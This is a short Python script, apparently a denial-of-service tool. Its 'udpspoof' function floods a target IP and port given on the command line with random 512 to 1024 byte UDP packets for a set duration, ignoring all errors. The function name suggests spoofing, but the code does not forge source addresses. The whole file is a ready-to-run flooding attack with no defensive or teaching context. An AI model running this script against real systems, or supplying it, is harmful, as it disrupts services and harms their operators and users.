import socket
import struct
import random
import sys
import time

def udpspoof(target_ip, target_port, duration):
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(random.randint(512, 1024))
            sock.sendto(data, (target_ip, target_port))
            sock.close()
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    
    udpspoof(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
